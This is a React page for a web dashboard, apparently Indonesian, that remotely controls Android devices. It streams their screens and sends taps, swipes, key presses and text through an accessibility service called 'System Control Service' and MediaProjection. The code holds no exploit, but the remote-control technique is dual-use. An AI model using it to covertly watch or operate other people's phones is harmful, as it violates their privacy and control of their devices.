'use client'
import { Suspense, useState, useCallback, useRef, useEffect } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import {
  Monitor, Play, Square, Camera, Send,
  ChevronLeft, Home, LayoutGrid, Volume2, VolumeX, Power,
  ArrowUp, ArrowDown, ArrowLeft, ArrowRight,
  Settings, CheckCircle, XCircle, Loader2, RotateCcw,
} from 'lucide-react'

// ─── API Helpers ─────────────────────────────────────────────────────────────
async function sendCmd(deviceId: string, command: string, extra?: string) {
  const r = await fetch('/api/device/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command, extra }),
  })
  return r.json().catch(() => ({ ok: false }))
}

async function apiStreamMode(deviceId: string, action: 'start' | 'stop', cmd?: string, targetFps?: number) {
  await fetch('/api/device/stream-mode', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, action, cmd, targetFps }),
  }).catch(() => {})
}

async function apiStreamAck(deviceId: string) {
  await fetch('/api/device/stream-ack', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId }),
  }).catch(() => {})
}

// ─── Quality Presets ──────────────────────────────────────────────────────────
const QUALITY = [
  { label: 'Micro', maxW: 320, qual: 35, fps: 8,  desc: 'Hemat data' },
  { label: 'Fast',  maxW: 480, qual: 50, fps: 12, desc: 'Seimbang' },
  { label: 'HD',    maxW: 720, qual: 65, fps: 10, desc: 'Jernih' },
]

// ─── Hardware Keys ────────────────────────────────────────────────────────────
const HW_KEYS = [
  { label: 'Back',   code: 'KEYCODE_BACK',       icon: ChevronLeft },
  { label: 'Home',   code: 'KEYCODE_HOME',        icon: Home },
  { label: 'Recent', code: 'KEYCODE_APP_SWITCH',  icon: LayoutGrid },
  { label: 'Vol+',   code: 'KEYCODE_VOLUME_UP',   icon: Volume2 },
  { label: 'Vol−',   code: 'KEYCODE_VOLUME_DOWN', icon: VolumeX },
  { label: 'Power',  code: 'KEYCODE_POWER',       icon: Power },
]

// ─── Ripple ───────────────────────────────────────────────────────────────────
function Ripple({ x, y, id }: { x: number; y: number; id: number }) {
  return (
    <div className="absolute pointer-events-none" style={{ left: x - 20, top: y - 20, width: 40, height: 40 }}>
      <div className="w-full h-full rounded-full border-2 border-cyan-400 animate-ping opacity-75" />
    </div>
  )
}

// ─── Remote Control Content ───────────────────────────────────────────────────
function RemoteControlContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const devId = selectedId ?? null

  // Stream
  const [streaming, setStreaming]   = useState(false)
  const [frame, setFrame]           = useState<string | null>(null)
  const [fps, setFps]               = useState(0)
  const [qualIdx, setQualIdx]       = useState(1)
  const qual = QUALITY[qualIdx]

  // UI
  const [inputText, setInputText]   = useState('')
  const [status, setStatus]         = useState('')
  const [busy, setBusy]             = useState(false)
  const [ripples, setRipples]       = useState<{ x: number; y: number; id: number }[]>([])
  const [screenSize, setScreenSize] = useState<{ w: number; h: number } | null>(null)
  const [rcStatus, setRcStatus]     = useState<{ a11y: boolean; mp: boolean } | null>(null)
  const [showSettings, setShowSettings] = useState(false)
  const [tapMode, setTapMode]       = useState<'tap' | 'swipe' | 'long'>('tap')

  const swipeStart = useRef<{ x: number; y: number } | null>(null)
  const esRef      = useRef<EventSource | null>(null)
  const fpsRef     = useRef<number[]>([])
  const rippleId   = useRef(0)

  // ── RC status fetch ──────────────────────────────────────────────────────────
  const fetchRcStatus = useCallback(async () => {
    if (!devId) return
    try {
      const r = await fetch('/api/device/command-wait', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: devId, command: 'rc_status', timeoutMs: 8000 }),
      })
      const res = await r.json().catch(() => ({ ok: false, result: null }))
      const text: string = res.result ?? ''
      setRcStatus({
        a11y: text.includes('AccessibilityService: ✅'),
        mp:   text.includes('MediaProjection: ✅'),
      })
      const m = text.match(/(\d+)x(\d+)/)
      if (m) setScreenSize({ w: parseInt(m[1]), h: parseInt(m[2]) })
    } catch {}
  }, [devId])

  useEffect(() => { fetchRcStatus() }, [fetchRcStatus])

  // Stop stream on device change
  useEffect(() => {
    return () => {
      esRef.current?.close()
      if (devId) apiStreamMode(devId, 'stop').catch(() => {})
    }
  }, [devId])

  // ── Live stream ───────────────────────────────────────────────────────────────
  const startStream = useCallback(async () => {
    if (!devId || streaming) return
    setStreaming(true); setStatus('Memulai stream…')
    const cmd = `screenshot:${qual.maxW}:${qual.qual}`
    await apiStreamMode(devId, 'start', cmd, qual.fps)
    const es = new EventSource(`/api/device/stream?deviceId=${devId}`)
    esRef.current = es
    es.onmessage = (e) => {
      if (!e.data || e.data === '[heartbeat]') return
      try {
        const d = JSON.parse(e.data)
        if (d.result && d.result.length > 100) {
          setFrame(d.result)
          const now = Date.now()
          fpsRef.current = [...fpsRef.current.filter(t => now - t < 1000), now]
          setFps(fpsRef.current.length)
          setStatus('')
          apiStreamAck(devId)
        }
      } catch {}
    }
    es.onerror = () => setStatus('⚠️ Stream error…')
  }, [devId, streaming, qual])

  const stopStream = useCallback(async () => {
    esRef.current?.close(); esRef.current = null
    if (devId) await apiStreamMode(devId, 'stop')
    setStreaming(false); setFps(0); setStatus('')
  }, [devId])

  // ── Snapshot ──────────────────────────────────────────────────────────────────
  const takeSnapshot = useCallback(async () => {
    if (!devId) return
    setBusy(true); setStatus('Mengambil screenshot…')
    try {
      const res = await sendCmd(devId, `screenshot:${qual.maxW}:${qual.qual}`)
      if (res.result && res.result.length > 100) { setFrame(res.result); setStatus('') }
      else setStatus('⚠️ ' + (res.result ?? 'Gagal'))
    } finally { setBusy(false) }
  }, [devId, qual])

  // ── Ripple ────────────────────────────────────────────────────────────────────
  const addRipple = useCallback((x: number, y: number) => {
    const id = ++rippleId.current
    setRipples(r => [...r, { x, y, id }])
    setTimeout(() => setRipples(r => r.filter(rr => rr.id !== id)), 700)
  }, [])

  // ── Coordinates ───────────────────────────────────────────────────────────────
  const toPercent = useCallback((e: React.MouseEvent<HTMLImageElement>) => {
    const rect = e.currentTarget.getBoundingClientRect()
    return {
      xp: (e.clientX - rect.left) / rect.width,
      yp: (e.clientY - rect.top) / rect.height,
      px: e.clientX - rect.left,
      py: e.clientY - rect.top,
    }
  }, [])

  // ── Pointer handlers ──────────────────────────────────────────────────────────
  const handlePointerDown = useCallback((e: React.MouseEvent<HTMLImageElement>) => {
    const { xp, yp } = toPercent(e)
    swipeStart.current = { x: xp, y: yp }
  }, [toPercent])

  const handlePointerUp = useCallback(async (e: React.MouseEvent<HTMLImageElement>) => {
    if (!devId) return
    const { xp, yp, px, py } = toPercent(e)
    const start = swipeStart.current
    swipeStart.current = null

    if (tapMode === 'long') {
      addRipple(px, py)
      setStatus(`Long press (${(xp*100).toFixed(0)}%, ${(yp*100).toFixed(0)}%)`)
      await sendCmd(devId, `input_longpress_pct:${xp.toFixed(4)}:${yp.toFixed(4)}`)
      setStatus(''); return
    }

    if (tapMode === 'swipe' && start) {
      const dx = Math.abs(xp - start.x), dy = Math.abs(yp - start.y)
      if (dx > 0.03 || dy > 0.03) {
        addRipple(px, py); setStatus('Swipe')
        await sendCmd(devId, `input_swipe_pct:${start.x.toFixed(4)}:${start.y.toFixed(4)}:${xp.toFixed(4)}:${yp.toFixed(4)}:250`)
        setStatus(''); return
      }
    }

    // default: tap
    addRipple(px, py)
    setStatus(`Tap (${(xp*100).toFixed(0)}%, ${(yp*100).toFixed(0)}%)`)
    await sendCmd(devId, `input_tap_pct:${xp.toFixed(4)}:${yp.toFixed(4)}`)
    setStatus('')
  }, [devId, tapMode, toPercent, addRipple])

  // ── Keys & text ───────────────────────────────────────────────────────────────
  const pressKey = useCallback(async (code: string) => {
    if (!devId) return
    setStatus(`Key: ${code}`)
    await sendCmd(devId, `input_key:${code}`)
    setStatus('')
  }, [devId])

  const sendText = useCallback(async () => {
    if (!devId || !inputText.trim()) return
    setStatus('Mengirim teks…')
    await sendCmd(devId, `input_text:${inputText}`)
    setInputText(''); setStatus('✅ Teks dikirim')
    setTimeout(() => setStatus(''), 1500)
  }, [devId, inputText])

  const aspect = screenSize ? screenSize.h / screenSize.w : 16 / 9

  // ── Render ────────────────────────────────────────────────────────────────────
  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />

      {/* ── Content ─────────────────────────────────────────── */}
      <div className="flex-1 flex flex-col min-h-0 bg-gray-950">

        {!devId ? (
          <div className="flex-1 flex items-center justify-center">
            <div className="text-center text-gray-400">
              <Monitor size={48} className="mx-auto mb-3 opacity-30" />
              <p className="text-lg font-medium">Pilih device terlebih dahulu</p>
              <p className="text-sm mt-1 opacity-60">Gunakan dropdown di sidebar</p>
            </div>
          </div>
        ) : (
          <>
            {/* ── Top Bar ────────────────────────────────── */}
            <div className="flex items-center gap-3 px-4 py-2 bg-gray-900 border-b border-gray-800">
              <Monitor size={16} className="text-cyan-400" />
              <span className="text-sm font-semibold text-white">Remote Control v2</span>
              <span className="text-xs text-gray-500">No Shizuku</span>
              <div className="flex items-center gap-2 ml-auto">
                {rcStatus && (
                  <>
                    <span className={`flex items-center gap-1 text-xs px-2 py-0.5 rounded-full ${rcStatus.a11y ? 'bg-green-900/60 text-green-300' : 'bg-red-900/60 text-red-300'}`}>
                      {rcStatus.a11y ? <CheckCircle size={10}/> : <XCircle size={10}/>} A11y
                    </span>
                    <span className={`flex items-center gap-1 text-xs px-2 py-0.5 rounded-full ${rcStatus.mp ? 'bg-green-900/60 text-green-300' : 'bg-red-900/60 text-red-300'}`}>
                      {rcStatus.mp ? <CheckCircle size={10}/> : <XCircle size={10}/>} Screen
                    </span>
                  </>
                )}
                <button onClick={fetchRcStatus} className="p-1 hover:text-cyan-400 text-gray-500 transition-colors">
                  <RotateCcw size={13} />
                </button>
                <button onClick={() => setShowSettings(s => !s)} className={`p-1 transition-colors ${showSettings ? 'text-cyan-400' : 'text-gray-500 hover:text-gray-300'}`}>
                  <Settings size={13} />
                </button>
              </div>
            </div>

            {/* ── Settings Panel ──────────────────────── */}
            {showSettings && (
              <div className="bg-gray-900 border-b border-gray-800 px-4 py-3 flex flex-wrap gap-4 items-center">
                <div className="flex items-center gap-2">
                  <span className="text-xs text-gray-400 mr-1">Kualitas:</span>
                  {QUALITY.map((q, i) => (
                    <button key={q.label} onClick={() => setQualIdx(i)}
                      className={`px-3 py-1 rounded text-xs font-medium transition-colors ${qualIdx === i ? 'bg-cyan-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700'}`}>
                      {q.label} <span className="text-[10px] ml-1 opacity-70">{q.desc}</span>
                    </button>
                  ))}
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-gray-400 mr-1">Mode:</span>
                  {([['tap','Tap'],['swipe','Swipe'],['long','Long Press']] as const).map(([m, l]) => (
                    <button key={m} onClick={() => setTapMode(m)}
                      className={`px-3 py-1 rounded text-xs font-medium transition-colors ${tapMode === m ? 'bg-violet-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700'}`}>
                      {l}
                    </button>
                  ))}
                </div>
                {screenSize && <span className="text-xs text-gray-500">{screenSize.w}×{screenSize.h}</span>}
              </div>
            )}

            {/* ── Main Area ───────────────────────────── */}
            <div className="flex-1 flex flex-col lg:flex-row min-h-0 overflow-hidden">

              {/* Screen */}
              <div className="flex-1 flex flex-col items-center justify-center bg-black min-h-0 p-4">
                <div className="w-full max-w-sm mb-2 flex items-center justify-between text-xs">
                  <span className="text-gray-600">
                    {streaming ? (
                      <span className="text-green-400 flex items-center gap-1">
                        <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse inline-block"/> LIVE · {fps} fps
                      </span>
                    ) : frame ? 'Snapshot' : 'Tidak ada gambar'}
                  </span>
                  <span className="text-gray-500 truncate max-w-[200px]">{status}</span>
                </div>

                <div className="relative bg-gray-900 rounded-xl overflow-hidden shadow-2xl border border-gray-800 w-full max-w-sm cursor-crosshair select-none"
                  style={{ aspectRatio: `1 / ${aspect}` }}>
                  {frame ? (
                    <>
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img src={`data:image/jpeg;base64,${frame}`} alt="Screen"
                        className="w-full h-full object-cover" draggable={false}
                        onPointerDown={handlePointerDown} onPointerUp={handlePointerUp} />
                      <div className="absolute inset-0 pointer-events-none">
                        {ripples.map(r => <Ripple key={r.id} {...r} />)}
                      </div>
                      <div className="absolute top-2 right-2 text-[10px] bg-black/60 px-1.5 py-0.5 rounded text-gray-300">
                        {tapMode === 'tap' ? '✋ TAP' : tapMode === 'swipe' ? '👆 SWIPE' : '⏱ LONG'}
                      </div>
                    </>
                  ) : (
                    <div className="w-full h-full flex flex-col items-center justify-center text-gray-600">
                      <Monitor size={40} className="mb-3 opacity-30" />
                      <p className="text-sm">Belum ada gambar</p>
                      <p className="text-xs mt-1 opacity-60">Klik Live atau Snapshot</p>
                    </div>
                  )}
                </div>

                <div className="flex gap-3 mt-4">
                  {!streaming ? (
                    <button onClick={startStream} disabled={busy}
                      className="flex items-center gap-2 px-5 py-2 bg-green-600 hover:bg-green-500 text-white rounded-lg text-sm font-medium transition-colors disabled:opacity-50">
                      <Play size={14} /> Live
                    </button>
                  ) : (
                    <button onClick={stopStream}
                      className="flex items-center gap-2 px-5 py-2 bg-red-600 hover:bg-red-500 text-white rounded-lg text-sm font-medium transition-colors">
                      <Square size={14} /> Stop
                    </button>
                  )}
                  <button onClick={takeSnapshot} disabled={busy}
                    className="flex items-center gap-2 px-5 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded-lg text-sm font-medium transition-colors disabled:opacity-50">
                    {busy ? <Loader2 size={14} className="animate-spin"/> : <Camera size={14} />} Snapshot
                  </button>
                </div>
              </div>

              {/* Controls Panel */}
              <div className="w-full lg:w-60 bg-gray-900 border-t lg:border-t-0 lg:border-l border-gray-800 flex flex-col overflow-y-auto">

                {/* Hardware Keys */}
                <div className="p-3 border-b border-gray-800">
                  <p className="text-[10px] text-gray-500 uppercase tracking-widest mb-2">Hardware Keys</p>
                  <div className="grid grid-cols-3 gap-1.5">
                    {HW_KEYS.map(({ label, code, icon: Icon }) => (
                      <button key={code} onClick={() => pressKey(code)}
                        className="flex flex-col items-center gap-1 p-2 bg-gray-800 hover:bg-gray-700 active:bg-gray-600 rounded-lg text-gray-300 hover:text-white transition-colors">
                        <Icon size={16} />
                        <span className="text-[10px]">{label}</span>
                      </button>
                    ))}
                  </div>
                </div>

                {/* D-Pad */}
                <div className="p-3 border-b border-gray-800">
                  <p className="text-[10px] text-gray-500 uppercase tracking-widest mb-2">D-Pad</p>
                  <div className="grid grid-cols-3 gap-1">
                    <div/>
                    <button onClick={() => pressKey('KEYCODE_DPAD_UP')} className="p-2 bg-gray-800 hover:bg-gray-700 rounded-lg flex items-center justify-center text-gray-300 hover:text-white transition-colors"><ArrowUp size={14}/></button>
                    <div/>
                    <button onClick={() => pressKey('KEYCODE_DPAD_LEFT')} className="p-2 bg-gray-800 hover:bg-gray-700 rounded-lg flex items-center justify-center text-gray-300 hover:text-white transition-colors"><ArrowLeft size={14}/></button>
                    <button onClick={() => pressKey('KEYCODE_DPAD_CENTER')} className="p-2 bg-gray-800 hover:bg-gray-700 rounded-lg flex items-center justify-center text-xs text-gray-400 hover:text-white transition-colors">OK</button>
                    <button onClick={() => pressKey('KEYCODE_DPAD_RIGHT')} className="p-2 bg-gray-800 hover:bg-gray-700 rounded-lg flex items-center justify-center text-gray-300 hover:text-white transition-colors"><ArrowRight size={14}/></button>
                    <div/>
                    <button onClick={() => pressKey('KEYCODE_DPAD_DOWN')} className="p-2 bg-gray-800 hover:bg-gray-700 rounded-lg flex items-center justify-center text-gray-300 hover:text-white transition-colors"><ArrowDown size={14}/></button>
                    <div/>
                  </div>
                </div>

                {/* Quick Swipes */}
                <div className="p-3 border-b border-gray-800">
                  <p className="text-[10px] text-gray-500 uppercase tracking-widest mb-2">Quick Swipe</p>
                  <div className="grid grid-cols-2 gap-1.5">
                    {[
                      { l: '↑ Scroll Up',   c: 'input_swipe_pct:0.5:0.75:0.5:0.25:220' },
                      { l: '↓ Scroll Down', c: 'input_swipe_pct:0.5:0.25:0.5:0.75:220' },
                      { l: '← Swipe Left',  c: 'input_swipe_pct:0.8:0.5:0.2:0.5:200' },
                      { l: '→ Swipe Right', c: 'input_swipe_pct:0.2:0.5:0.8:0.5:200' },
                    ].map(({ l, c }) => (
                      <button key={l} onClick={() => { if (devId) sendCmd(devId, c) }}
                        className="px-2 py-1.5 bg-gray-800 hover:bg-gray-700 rounded text-xs text-gray-300 hover:text-white transition-colors text-left">
                        {l}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Text Input */}
                <div className="p-3 border-b border-gray-800">
                  <p className="text-[10px] text-gray-500 uppercase tracking-widest mb-2">Input Teks</p>
                  <div className="flex gap-1">
                    <input type="text" value={inputText} onChange={e => setInputText(e.target.value)}
                      onKeyDown={e => e.key === 'Enter' && sendText()}
                      placeholder="Ketik teks…"
                      className="flex-1 bg-gray-800 text-white text-sm px-3 py-2 rounded-lg border border-gray-700 focus:border-cyan-500 focus:outline-none placeholder-gray-600"/>
                    <button onClick={sendText} disabled={!inputText.trim()}
                      className="p-2 bg-cyan-600 hover:bg-cyan-500 disabled:opacity-40 text-white rounded-lg transition-colors">
                      <Send size={14}/>
                    </button>
                  </div>
                  <p className="text-[10px] text-gray-600 mt-1">Aktifkan EditText di HP dulu</p>
                </div>

                {/* RC Status */}
                <div className="p-3 mt-auto">
                  <p className="text-[10px] text-gray-500 uppercase tracking-widest mb-2">Status</p>
                  <div className="space-y-1.5 text-xs">
                    <div className="flex items-center justify-between">
                      <span className="text-gray-400">Accessibility</span>
                      {rcStatus
                        ? <span className={rcStatus.a11y ? 'text-green-400' : 'text-red-400'}>{rcStatus.a11y ? '✅ Aktif' : '❌ Nonaktif'}</span>
                        : <span className="text-gray-600">—</span>}
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-gray-400">MediaProjection</span>
                      {rcStatus
                        ? <span className={rcStatus.mp ? 'text-green-400' : 'text-red-400'}>{rcStatus.mp ? '✅ Aktif' : '❌ Nonaktif'}</span>
                        : <span className="text-gray-600">—</span>}
                    </div>
                    {rcStatus && !rcStatus.a11y && (
                      <p className="text-[10px] text-amber-500 mt-1">Settings → Accessibility → System Control Service</p>
                    )}
                    {rcStatus && !rcStatus.mp && (
                      <p className="text-[10px] text-amber-500">Buka app → izinkan tampilkan layar</p>
                    )}
                  </div>
                </div>

              </div>
            </div>
          </>
        )}
      </div>
    </div>
  )
}

// ─── Page Export ──────────────────────────────────────────────────────────────
export default function RemoteControlPage() {
  return (
    <Suspense fallback={
      <div className="flex-1 flex items-center justify-center text-gray-500 min-h-screen">
        <Loader2 className="animate-spin mr-2" size={20} /> Loading…
      </div>
    }>
      <RemoteControlContent />
    </Suspense>
  )
}
